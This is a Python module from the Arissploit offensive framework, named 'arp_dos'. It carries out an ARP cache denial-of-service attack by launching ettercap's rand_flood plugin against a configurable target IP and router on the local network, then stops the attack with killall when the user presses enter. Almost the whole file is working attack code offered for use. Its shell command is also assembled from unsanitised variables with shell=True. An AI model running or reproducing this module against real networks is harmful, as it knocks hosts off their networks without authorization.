from core.arissploit import *
from core import colors
import subprocess
from time import sleep
import os

conf = {
	"name": "arp_dos",
	"version": "1.0",
	"shortdesc": "Arp cache denial of service attack.",
	"author": "Entynetproject",
	"initdate": "3.3.2016",
	"lastmod": "31.12.2016",
	"needroot": 1,
	"apisupport": False,
	"dependencies": ["xterm", "ettercap"]

}


# List of the variables
variables = OrderedDict((
	('target', ['192.168.1.2', 'Target ip address.']),
	('router', ['192.168.1.1', 'Router ip address.']),
	('interface', ['eth0', 'Network interface name.']),
))


# Additional help notes
help_notes = colors.red+"This module will not work without root permissions!"+colors.end

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	printInfo("Attack has been started...")
	command = 'xterm -e ettercap -i '+ variables['interface'][0] + ' -Tq -P rand_flood ' + '/'+variables['router'][0]+'//' + ' ' + '/'+variables['target'][0]+'//'
	subprocess.Popen(command, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
	line_4 = colors.blue+"To stop attack press [enter]"+colors.end
	fin = input(line_4)
	os.system('killall ettercap')
	printInfo("Attack stoped.")
